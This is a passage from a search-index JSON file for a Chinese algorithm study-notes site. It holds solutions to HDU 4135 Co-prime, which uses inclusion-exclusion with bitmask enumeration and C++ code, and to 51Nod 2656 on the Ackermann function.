G_p \u7528 3 \u4f4d\u4e8c\u8fdb\u5236\u6765\u8868\u793a G_p = (XXX)_B,\\ (X \\in \\{0, 1\\}) \u6839\u636e\u6392\u5217\u7ec4\u5408\u89c4\u5f8b\uff0c n \u4e2a\u6570\u7684\u4efb\u610f\u4e2a\u6570\u7684\u7ec4\u5408\u5171\u6709 2^n \u79cd\u60c5\u51b5\u3002 \\sum_{i = 0}^n C_n^i = 2^n \u6211\u4eec\u53ea\u9700\u8981\u628a G_p \u4ece 0 \u52a0\u5230 2^n - 1 \u5373\u53ef G_p \\in [(000)_B, (111)_B] \u82e5 G_p \u4e2d\u67d0\u4e00\u4f4d\u7f6e j \u4e3a 1\uff0c\u5219\u628a P[j] \u53d6\u51fa\u4e0e\u5176\u4ed6\u4e3a 1 \u7684\u8d28\u56e0\u6570\u76f8\u4e58\u5373\u53ef\u904d\u5386\u6240\u6709\u7ec4\u5408\u60c5\u51b5\u3002 3. \u4ee3\u7801 # #include <algorithm> #include <iostream> #include <string.h> using namespace std; typedef long long ll; // \u5b58\u50a8\u8d28\u56e0\u6570 ll prime[100]; // \u8d28\u56e0\u6570\u8ba1\u6570 int cnt; // \u8ba1\u7b97\u8d28\u56e0\u6570 void init(int m) { cnt = 0; for (ll i = 2; i * i < m; i++) // \u82e5\u4e3a\u56e0\u6570 if (m % i == 0) { //prime\u50a8\u5b58\u7d20\u56e0\u5b50\uff0ccnt\u4e3a\u7d20\u56e0\u5b50\u7684\u4e2a\u6570 prime[cnt++] = i; // \u5c06\u8fd9\u4e2a\u8d28\u56e0\u6570\u4ecem\u4e2d\u9664\u53bb\uff0c\u9632\u6b62\u8ba1\u7b97\u5230\u8d28\u56e0\u6570\u7684\u500d\u6570 while (m % i == 0) { m /= i; } } //\u8fd9\u91cc\u662f\u56e0\u4e3a\u6709\u7684n\u7684\u56e0\u5b50\u5927\u4e8esqrt(n)\uff0c\u6bd4\u598214\uff0c\u4ed6\u7684\u7d20\u56e0\u5b50\u67092\uff0c7 if (m > 1) prime[cnt++] = m; } // \u5bb9\u65a5\u539f\u7406\u8ba1\u7b97[2, cur] \u4e2d\u4e0d\u4e0e N \u4e92\u65a5\u7684\u6570\u7684\u6570\u91cf ll IE_Principle(ll cur) { // \u5b58\u50a8\u8d28\u56e0\u6570\u7ec4\u5408\u7684\u4e58\u79ef ll res = 0; // \u5b58\u50a8\u7ed3\u679c ll ans = 0; // \u4ece 0 \u904d\u5386\u5230 2^cnt - 1 for (ll i = 1; i < ll(1 << cnt); i++) { res = 1; ll flag = 0; // \u904d\u5386\u6240\u6709\u6570\u4f4d for (ll j = 0; j < cnt; j++) { //\u51fa\u73b0\u56e0\u5b50 if (i & (ll(1 << j))) { // \u7edf\u8ba1\u51fa\u73b0\u7684\u96c6\u5408\u4e2a\u6570 flag++; // \u53d6\u5e76\u4e4b\u540e\u7684\u56e0\u5b50\u4e58\u79ef res *= prime[j]; } } // \u5224\u65ad\u7ec4\u5408\u4e2d\u56e0\u5b50\u4e2a\u6570\u7684\u5947\u5076\u6027 if (flag & 1) { // \u82e5\u4e3a\u5947\u6570 \u52a0 ans += cur / res; } else { // \u82e5\u4e3a\u5076\u6570 \u51cf ans -= cur / res; } } return ans; } int main() { // test case ll t; cin >> t; // \u8ba1\u6570 int icase = 0; // \u5b58\u50a8 A B N ll a, b, n; // \u5b58\u50a8\u7ed3\u679c ll ans; // \u5bf9\u6bcf\u4e00\u4e2atest case\u8fdb\u884c\u904d\u5386 while (t--) { // \u521d\u59cb\u5316 memset(prime, 0, sizeof(prime)); // \u8f93\u5165 cin >> a >> b >> n; // \u6c42\u8d28\u56e0\u6570 init(n); // \u4f7f\u7528\u5bb9\u65a5\u539f\u7406\u8fdb\u884c\u8ba1\u7b97\u5e76\u8f93\u51fa ans = b - IE_Principle(b) - (a - 1 - IE_Principle(a - 1)); printf(\"Case #%d: %lld\\n\", ++icase, ans); } return 0; } \u4ee3\u7801\u53c2\u8003\u81ea \u6df1\u6d77\u6ca7\u6f9c\u591c\u672a\u592e\u7684\u535a\u5ba2 2 \uff0c\u601d\u8def\u501f\u9274\u4e86 \u751f\u5982\u590f\u82b1\u7684\u535a\u5ba2 3 \u3002 4. \u53c2\u8003\u6587\u732e # [1] \u6df1\u6d77\u6ca7\u6f9c\u591c\u672a\u592e. CSDN\u535a\u5ba2. \u5bb9\u65a5\u539f\u7406\uff08\u7ec4\u5408\u6570\u5b66\uff09\u603b\u7ed3 [2] \u6df1\u6d77\u6ca7\u6f9c\u591c\u672a\u592e. CSDN\u535a\u5ba2. HDU4135 Co-prime\u3010\u5bb9\u65a5\u539f\u7406\u30113\u65b9\u6cd5 [3] \u751f\u5982\u590f\u82b1. \u535a\u5ba2\u56ed\u535a\u5ba2. hdu 4135(\u5bb9\u65a5\u539f\u7406) \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com Github\uff1a https://github.com/CurrenWong \u6b22\u8fce\u8f6c\u8f7d/Star/Fork\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"4.HDU 4135 Co prime"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/4.HDU_4135_Co-prime/#hdu-4135-co-prime","text":"","title":"HDU 4135 Co-prime"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/4.HDU_4135_Co-prime/#_1","text":"HDU 4135 Co-prime \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Limit 1.2. Problem Description 1.3. Input 1.4. Output 1.5. Sample Input 1.6. Sample Output 1.7. Source 2. \u89e3\u8bfb 3. \u4ee3\u7801 4. \u53c2\u8003\u6587\u732e","title":"\u76ee\u5f55"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/4.HDU_4135_Co-prime/#1","text":"","title":"1. \u9898\u76ee\u63cf\u8ff0"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/4.HDU_4135_Co-prime/#11-limit","text":"Time Limit: 1000 ms Memory Limit: 32768 kB","title":"1.1. Limit"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/4.HDU_4135_Co-prime/#12-problem-description","text":"Given a number N , you are asked to count the number of integers between A and B inclusive which are relatively prime to N . Two integers are said to be co-prime or relatively prime if they have no common positive divisors other than 1 or, equivalently, if their greatest common divisor is 1. The number 1 is relatively prime to every integer.","title":"1.2. Problem Description"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/4.HDU_4135_Co-prime/#13-input","text":"The first line on input contains T (0 < T \\le 100) the number of test cases, each of the next T lines contains three integers A, B, N where (1 \\le A \\le B \\le 10^{15}) and (1 \\le N \\le 10^{9}) .","title":"1.3. Input"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/4.HDU_4135_Co-prime/#14-output","text":"For each test case, print the number of integers between A and B inclusive which are relatively prime to N. Follow the output format below.","title":"1.4. Output"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/4.HDU_4135_Co-prime/#15-sample-input","text":"2 1 10 2 3 15 5","title":"1.5. Sample Input"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/4.HDU_4135_Co-prime/#16-sample-output","text":"Case #1: 5 Case #2: 10 In the first test case, the five integers in range [1,10] which are relatively prime to 2 are {1,3,5,7,9} .","title":"1.6. Sample Output"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/4.HDU_4135_Co-prime/#17-source","text":"The Third Lebanese Collegiate Programming Contest","title":"1.7. Source"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/4.HDU_4135_Co-prime/#2","text":"\u8fd9\u9053\u9898\u6211\u4eec\u9700\u8981\u4f7f\u7528\u5230\u7684\u662f \u5bb9\u65a5\u539f\u7406 \u3002 \u5bb9\u65a5\u539f\u7406\u5206\u4e3a\u4e09\u79cd\u5b9e\u73b0 1 \uff1a 1.\u4f4d\u8fd0\u7b97\u4e0e\u4e8c\u8fdb\u5236\u679a\u4e3e\uff08\u5bb9\u6613\u7406\u89e3\uff09 2.\u961f\u5217\u6570\u7ec4\uff08\u8017\u65f6\u6700\u77ed\uff09 3.\u9012\u5f52\uff08\u4ee3\u7801\u6700\u77ed\u4f46\u4e0d\u5bb9\u6613\u7406\u89e3\uff09 \u5728\u8fd9\u91cc\u6211\u4eec\u4e3b\u8981\u8ba8\u8bba\u6bd4\u8f83\u597d\u7406\u89e3\u7684 \u4f4d\u8fd0\u7b97\u4e0e\u4e8c\u8fdb\u5236\u679a\u4e3e \u65b9\u6cd5\uff0c\u5176\u4ed6\u4e24\u79cd\u65b9\u6cd5\u53ef\u4ee5\u53c2\u8003 \u6df1\u6d77\u6ca7\u6f9c\u591c\u672a\u592e\u7684\u535a\u5ba2 2 \u3002 \u9996\u5148\u5206\u6790\u95ee\u9898\uff0c\u6211\u4eec\u8981\u6c42\u7684\u662f\u533a\u95f4 [A, B] \u4e4b\u5185 \u548c N \u4e92\u8d28\u7684\u6570\u7684\u4e2a\u6570\uff0c\u8003\u8651\u9053\u9898\u76ee\u4e2d\u7684\u8303\u56f4 1 \\le A \\le B \\le 10^{15} \uff0c\u66b4\u529b\u7b97\u6cd5\u662f\u4e0d\u592a\u53ef\u80fd\u4e86\u3002 \u800c\u5728 \u4e4b\u524d\u7684\u4e00\u7bc7\u7b14\u8bb0\u4e2d \uff0c\u6211\u4eec\u63d0\u5230\u4e86\u7528\u57c3\u6c0f\u7b5b\u6cd5\u6765\u6c42 [2, n] \u8303\u56f4\u5185\u7684\u6240\u6709\u8d28\u6570\uff0c\u4e3b\u8981\u601d\u60f3\u662f\u4e0d\u65ad\u7b5b\u9664 [2, n] \u4e2d\u7684\u975e\u8d28\u6570\u548c\u5b83\u7684\u500d\u6570\uff0c\u76f4\u5230\u5217\u8868\u5185\u53ea\u5269\u4e0b\u8d28\u6570\u4e3a\u6b62\u3002\u4e5f\u5c31\u662f\u8bf4\u7b5b\u9664\u6389\u4e00\u4e2a\u533a\u95f4\u5185\u7684\u975e\u8d28\u6570\u662f\u6bd4\u8f83\u9ad8\u6548\u7684\u3002 \u987a\u7740\u8fd9\u4e2a\u601d\u8def\u6211\u4eec\u5c31\u53ef\u4ee5\u60f3\u5230\uff0c\u6211\u4eec\u53ef\u4ee5\u6c42\u51fa\u533a\u95f4 [2, A - 1] \u4e4b\u5185\u548c N \u4e0d\u4e92\u8d28\u7684\u6570\u7684\u6570\u91cf w_{A - 1} \u548c \u533a\u95f4 [2, B] \u4e4b\u5185\u548c N \u4e0d\u4e92\u8d28\u7684\u6570\u7684\u6570\u91cf w_B \uff0c\u8ba1\u7b97 (B - w_B) - (A - 1- w_{A - 1}) \u5c31\u53ef\u4ee5\u6c42\u51fa\u7b54\u6848\u4e86\u3002 \u90a3\u4e48\uff0c\u6211\u4eec\u8981\u600e\u4e48\u6c42\u51fa w_{A - 1} \u548c w_B \u5462\uff0c\u4e0d\u9700\u8981\u4e00\u4e2a\u4e2a\u53bb\u7b5b\u9664\u90a3\u4e48\u9ebb\u70e6\uff0c\u53ea\u9700\u8981\u6c42\u51fa N \u7684\u6240\u6709\u8d28\u56e0\u6570 p_i \uff0c\u5f62\u6210\u4e00\u4e2a\u96c6\u5408 P \uff0c\u628a [2, A - 1] \u548c [2, B] \u4e2d\u6240\u6709 P \u7684\u500d\u6570\u7684\u6570\u91cf\u6c42\u51fa\u6765\u5e76\u51cf\u53bb\u5c31\u53ef\u4ee5\u4e86\u3002 \u5982\u679c P \u96c6\u5408\u4e2d\u53ea\u6709\u4e00\u4e2a\u6570 p_1 \uff0c\u6211\u4eec\u53ea\u9700\u8981\u8fd9\u6837\u8ba1\u7b97\u5c31\u53ef\u4ee5\u4e86 w_{A - 1} = \\lfloor \\frac{A - 1}{p_1} \\rfloor w_B = \\lfloor \\frac{B}{p_1} \\rfloor \u4f46\u5f88\u660e\u663e P \u96c6\u5408\u4e2d\u5f88\u53ef\u80fd\u4e0d\u4ec5\u4ec5\u53ea\u6709\u4e00\u4e2a\u6570\uff0c\u8fd9\u91cc\u5c31\u6d89\u53ca\u5230 \u5bb9\u65a5\u539f\u7406 \u4e86\u3002 \u5047\u8bbe P = \\{2, 3, 5\\} \uff0c A = 30 \uff0c B = 60 \uff0c\u90a3\u4e48\u8ba1\u7b97\u516c\u5f0f\u5982\u4e0b { \\begin{aligned} w_{A - 1} =& {\\lfloor \\frac{A - 1}{2} \\rfloor} + {\\lfloor \\frac{A - 1}{3} \\rfloor} + {\\lfloor \\frac{A - 1}{5} \\rfloor} - {\\lfloor \\frac{A - 1}{2 \\times 3} \\rfloor} - {\\lfloor \\frac{A - 1}{3 \\times 5} \\rfloor} & \\\\ &{ - \\lfloor \\frac{A - 1}{2 \\times 5} \\rfloor} + {\\lfloor \\frac{A - 1}{2 \\times 3 \\times 5} \\rfloor} &\\\\ =& 14 + 9 + 5 - 4 - 1 - 2 + 0 &\\\\ =& 21 &\\\\ \\end{aligned} } { \\begin{aligned} w_B =& {\\lfloor \\frac{B}{2} \\rfloor} + {\\lfloor \\frac{B}{3} \\rfloor} + {\\lfloor \\frac{B}{5} \\rfloor} - {\\lfloor \\frac{B}{2 \\times 3} \\rfloor} - {\\lfloor \\frac{B}{3 \\times 5} \\rfloor} & \\\\ &{ - \\lfloor \\frac{B}{2 \\times 5} \\rfloor} + {\\lfloor \\frac{B}{2 \\times 3 \\times 5} \\rfloor} &\\\\ =& 30 + 20 + 12 - 10 - 4 - 6 + 2 &\\\\ =& 44 &\\\\ \\end{aligned} } ans = (B - w_B) - (A - 1 - w_{A - 1}) = 8 \u8fd9\u91cc\u53c8\u6d89\u53ca\u5230 \u5bb9\u65a5\u539f\u7406 \u4e2d\u4e00\u4e2a \u5947\u52a0\u5076\u51cf \u7684\u89c4\u5f8b\uff0c\u4e5f\u5c31\u662f\u5728\u8fed\u4ee3\u8ba1\u7b97\u7684\u8fc7\u7a0b\u4e2d w_{B} \u8981\u52a0\u4e0a B \u9664\u4ee5 \u5947\u6570\u4e2a\u8d28\u56e0\u6570 \u76f8\u4e58\u6240\u5f97\u7684\u7ed3\u679c\uff0c\u51cf\u53bb B \u9664\u4ee5 \u5076\u6570\u4e2a\u8d28\u56e0\u6570 \u76f8\u4e58\u6240\u5f97\u7684\u7ed3\u679c\u3002 \u53c8\u6709\u95ee\u9898\u51fa\u73b0\u4e86\uff0c\u6211\u4eec\u8981\u600e\u4e48\u904d\u5386\u6240\u6709\u7ec4\u5408\u7684\u60c5\u51b5\u5462\uff1f \u5728\u6700\u5f00\u59cb\u63d0\u5230\u7684 \u4f4d\u8fd0\u7b97\u4e0e\u4e8c\u8fdb\u5236\u679a\u4e3e \u65b9\u6cd5\u95ea\u4eae\u767b\u573a\u3002\u8fd8\u662f\u5047\u8bbe P = \\{2, 3, 5\\} \uff0c\u628a P \u7684\u7ec4\u5408\u60c5\u51b5 G_p \u7528 3 \u4f4d\u4e8c\u8fdb\u5236\u6765\u8868\u793a G_p = (XXX)_B,\\ (X \\in \\{0, 1\\}) \u6839\u636e\u6392\u5217\u7ec4\u5408\u89c4\u5f8b\uff0c n \u4e2a\u6570\u7684\u4efb\u610f\u4e2a\u6570\u7684\u7ec4\u5408\u5171\u6709 2^n \u79cd\u60c5\u51b5\u3002 \\sum_{i = 0}^n C_n^i = 2^n \u6211\u4eec\u53ea\u9700\u8981\u628a G_p \u4ece 0 \u52a0\u5230 2^n - 1 \u5373\u53ef G_p \\in [(000)_B, (111)_B] \u82e5 G_p \u4e2d\u67d0\u4e00\u4f4d\u7f6e j \u4e3a 1\uff0c\u5219\u628a P[j] \u53d6\u51fa\u4e0e\u5176\u4ed6\u4e3a 1 \u7684\u8d28\u56e0\u6570\u76f8\u4e58\u5373\u53ef\u904d\u5386\u6240\u6709\u7ec4\u5408\u60c5\u51b5\u3002","title":"2. \u89e3\u8bfb"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/4.HDU_4135_Co-prime/#3","text":"#include <algorithm> #include <iostream> #include <string.h> using namespace std; typedef long long ll; // \u5b58\u50a8\u8d28\u56e0\u6570 ll prime[100]; // \u8d28\u56e0\u6570\u8ba1\u6570 int cnt; // \u8ba1\u7b97\u8d28\u56e0\u6570 void init(int m) { cnt = 0; for (ll i = 2; i * i < m; i++) // \u82e5\u4e3a\u56e0\u6570 if (m % i == 0) { //prime\u50a8\u5b58\u7d20\u56e0\u5b50\uff0ccnt\u4e3a\u7d20\u56e0\u5b50\u7684\u4e2a\u6570 prime[cnt++] = i; // \u5c06\u8fd9\u4e2a\u8d28\u56e0\u6570\u4ecem\u4e2d\u9664\u53bb\uff0c\u9632\u6b62\u8ba1\u7b97\u5230\u8d28\u56e0\u6570\u7684\u500d\u6570 while (m % i == 0) { m /= i; } } //\u8fd9\u91cc\u662f\u56e0\u4e3a\u6709\u7684n\u7684\u56e0\u5b50\u5927\u4e8esqrt(n)\uff0c\u6bd4\u598214\uff0c\u4ed6\u7684\u7d20\u56e0\u5b50\u67092\uff0c7 if (m > 1) prime[cnt++] = m; } // \u5bb9\u65a5\u539f\u7406\u8ba1\u7b97[2, cur] \u4e2d\u4e0d\u4e0e N \u4e92\u65a5\u7684\u6570\u7684\u6570\u91cf ll IE_Principle(ll cur) { // \u5b58\u50a8\u8d28\u56e0\u6570\u7ec4\u5408\u7684\u4e58\u79ef ll res = 0; // \u5b58\u50a8\u7ed3\u679c ll ans = 0; // \u4ece 0 \u904d\u5386\u5230 2^cnt - 1 for (ll i = 1; i < ll(1 << cnt); i++) { res = 1; ll flag = 0; // \u904d\u5386\u6240\u6709\u6570\u4f4d for (ll j = 0; j < cnt; j++) { //\u51fa\u73b0\u56e0\u5b50 if (i & (ll(1 << j))) { // \u7edf\u8ba1\u51fa\u73b0\u7684\u96c6\u5408\u4e2a\u6570 flag++; // \u53d6\u5e76\u4e4b\u540e\u7684\u56e0\u5b50\u4e58\u79ef res *= prime[j]; } } // \u5224\u65ad\u7ec4\u5408\u4e2d\u56e0\u5b50\u4e2a\u6570\u7684\u5947\u5076\u6027 if (flag & 1) { // \u82e5\u4e3a\u5947\u6570 \u52a0 ans += cur / res; } else { // \u82e5\u4e3a\u5076\u6570 \u51cf ans -= cur / res; } } return ans; } int main() { // test case ll t; cin >> t; // \u8ba1\u6570 int icase = 0; // \u5b58\u50a8 A B N ll a, b, n; // \u5b58\u50a8\u7ed3\u679c ll ans; // \u5bf9\u6bcf\u4e00\u4e2atest case\u8fdb\u884c\u904d\u5386 while (t--) { // \u521d\u59cb\u5316 memset(prime, 0, sizeof(prime)); // \u8f93\u5165 cin >> a >> b >> n; // \u6c42\u8d28\u56e0\u6570 init(n); // \u4f7f\u7528\u5bb9\u65a5\u539f\u7406\u8fdb\u884c\u8ba1\u7b97\u5e76\u8f93\u51fa ans = b - IE_Principle(b) - (a - 1 - IE_Principle(a - 1)); printf(\"Case #%d: %lld\\n\", ++icase, ans); } return 0; } \u4ee3\u7801\u53c2\u8003\u81ea \u6df1\u6d77\u6ca7\u6f9c\u591c\u672a\u592e\u7684\u535a\u5ba2 2 \uff0c\u601d\u8def\u501f\u9274\u4e86 \u751f\u5982\u590f\u82b1\u7684\u535a\u5ba2 3 \u3002","title":"3. \u4ee3\u7801"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/4.HDU_4135_Co-prime/#4","text":"[1] \u6df1\u6d77\u6ca7\u6f9c\u591c\u672a\u592e. CSDN\u535a\u5ba2. \u5bb9\u65a5\u539f\u7406\uff08\u7ec4\u5408\u6570\u5b66\uff09\u603b\u7ed3 [2] \u6df1\u6d77\u6ca7\u6f9c\u591c\u672a\u592e. CSDN\u535a\u5ba2. HDU4135 Co-prime\u3010\u5bb9\u65a5\u539f\u7406\u30113\u65b9\u6cd5 [3] \u751f\u5982\u590f\u82b1. \u535a\u5ba2\u56ed\u535a\u5ba2. hdu 4135(\u5bb9\u65a5\u539f\u7406) \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com Github\uff1a https://github.com/CurrenWong \u6b22\u8fce\u8f6c\u8f7d/Star/Fork\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"4. \u53c2\u8003\u6587\u732e"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/5.51Nod_2656_%E9%98%BF%E5%85%8B%E6%9B%BC%E5%87%BD%E6%95%B0/","text":"51Nod 2656 \u963f\u514b\u66fc\u51fd\u6570 # \u76ee\u5f55 # 51Nod 2656 \u963f\u514b\u66fc\u51fd\u6570 \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Limit 1.2. Problem Description 1.3. Input 1.4. Output 1.5. Sample Input 1.6. Sample Output 1.7. Source 2. \u89e3\u8bfb 3. \u4ee3\u7801 1. \u9898\u76ee\u63cf\u8ff0 # 1.1. Limit # Time Limit: 1000 ms Memory Limit: 131,072 kB 1.2. Problem Description # \u963f\u514b\u66fc\uff08Arkmann\uff09\u51fd\u6570 A(m, n) \u4e2d\uff0cm\u4e0en\u7684\u5b9a\u4e49\u57df\u662f\u975e\u8d1f\u6574\u6570\u4e14\u672c\u9898\u4e2d m \\le 3 \uff0c n\\le 16 \u3002 \u51fd\u6570\u7684\u5b9a\u4e49\u4e3a\uff1a akm(m, n) = {\\left\\{ \\begin{aligned} n+1 & , (m = 0)& \\\\ akm(m - 1, 1) & , (m > 0, n = 0)& \\\\ akm(m - 1, akm(m, n - 1)) & , (m > 0, n > 0)& \\\\ \\end{aligned}\\right. } 1.3. Input # \u4e24\u4e2a\u6574\u6570 m n 1.4. Output # \u4e00\u4e2a\u6574\u6570\uff0c akm(m,n) \u7684\u7ed3\u679c 1.5. Sample Input # 1 1 1.6. Sample Output # 3 1.7. Source # 51Nod 2656 \u963f\u514b\u66fc\u51fd\u6570 2. \u89e3\u8bfb # \u5982\u679c\u76f4\u63a5\u4f7f\u7528 akm(m,n) \u8fdb\u884c\u8ba1\u7b97\uff0c\u6700\u540e\u4e00\u4e2a\u70b9\u4f1a\u8d85\u65f6\u3002\u8fd9\u65f6\u8003\u8651\u5230\u9898\u76ee\u6240\u7ed9\u7684\u6570\u636e\u8303\u56f4 0 \\le m \\le 3 \uff0c 0 \\le n\\le 16 \u6bd4\u8f83\u5c0f\uff0c\u5e26\u5165\u4e00\u4e9b\u6570\u5b57\u5c1d\u8bd5\u627e\u51fa akm(m,n) \u7684\u89c4\u5f8b\u3002 m n akm(m,n) m n akm(m,n) 1 1 3 2 1 5 1 2 4 2 2 7 1 3 5 2 3 9 1 n n+2 2 n 2n+3 m n akm(m,n) 3 1 13 3 2 29 3 3 61 3 4 125 3 n 2^{n+3} - 3 \u518d\u5c06\u627e\u51fa\u7684\u89c4\u5f8b\u5199\u6210\u4e00\u4e2a\u51fd\u6570\u8fdb\u884c\u8ba1\u7b97\u5373\u53ef\u3002 3. \u4ee3\u7801 # #include <algorithm> #include <iostream> #include <math.h> #include <string.h> using namespace std; int akm(int m, int n) { if (m == 0) { return n + 1; } else if (m > 0 && n == 0) { return akm(m - 1, 1); } else if (m > 0 && n > 0) { return akm(m - 1, akm(m, n - 1)); } else { return 0; } } long long calculate(int m, int n) { if (m == 0) { return n + 1; } else if (m == 1) { return n + 2; } else if (m == 2) { return 2 * n + 3; } else if (m == 3) { return pow(2, n + 3) - 3; } else { return 0; } } int main() { // test case int m, n; scanf(\"%d %d\", &m, &n); // \u8ba1\u7b97 printf(\"%lld\", calculate(m, n)); } \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com Github\uff1a https://github.com/CurrenWong \u6b22\u8fce\u8f6c\u8f7d/Star/Fork\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"5.51Nod 2656 \u963f\u514b\u66fc\u51fd\u6570"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/5.51Nod_2656_%E9%98%BF%E5%85%8B%E6%9B%BC%E5%87%BD%E6%95%B0/#51nod-2656","text":"","title":"51Nod 2656 \u963f\u514b\u66fc\u51fd\u6570"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/5.51Nod_2656_%E9%98%BF%E5%85%8B%E6%9B%BC%E5%87%BD%E6%95%B0/#_1","text":"51Nod 2656 \u963f\u514b\u66fc\u51fd\u6570 \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Limit 1.2. Problem Description 1.3. Input 1.4. Output 1.5. Sample Input 1.6. Sample Output 1.7. Source 2. \u89e3\u8bfb 3. \u4ee3\u7801","title":"\u76ee\u5f55"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/5.51Nod_2656_%E9%98%BF%E5%85%8B%E6%9B%BC%E5%87%BD%E6%95%B0/#1","text":"","title":"1. \u9898\u76ee\u63cf\u8ff0"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/5.51Nod_2656_%E9%98%BF%E5%85%8B%E6%9B%BC%E5%87%BD%E6%95%B0/#11-limit","text":"Time Limit: 1000 ms Memory Limit: 131,072 kB","title":"1.1. Limit"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/5.51Nod_2656_%E9%98%BF%E5%85%8B%E6%9B%BC%E5%87%BD%E6%95%B0/#12-problem-description","text":"\u963f\u514b\u66fc\uff08Arkmann\uff09\u51fd\u6570 A(m, n) \u4e2d\uff0cm\u4e0en\u7684\u5b9a\u4e49\u57df\u662f\u975e\u8d1f\u6574\u6570\u4e14\u672c\u9898\u4e2d m \\le 3 \uff0c n\\le 16 \u3002 \u51fd\u6570\u7684\u5b9a\u4e49\u4e3a\uff1a akm(m, n) = {\\left\\{ \\begin{aligned} n+1 & , (m = 0)& \\\\ akm(m - 1, 1) & , (m > 0, n = 0)& \\\\ akm(m - 1, akm(m, n - 1)) & , (m > 0, n > 0)& \\\\ \\end{aligned}\\right. }","title":"1.2. Problem Description"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/5.51Nod_2656_%E9%98%BF%E5%85%8B%E6%9B%BC%E5%87%BD%E6%95%B0/#13-input","text":"\u4e24\u4e2a\u6574\u6570 m n","title":"1.3. Input"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/5.51Nod_2656_%E9%98%BF%E5%85%8B%E6%9B%BC%E5%87%BD%E6%95%B0/#14-output","text":"\u4e00\u4e2a\u6574\u6570\uff0c akm(m,n) \u7684\u7ed3\u679c","title":"1.4. 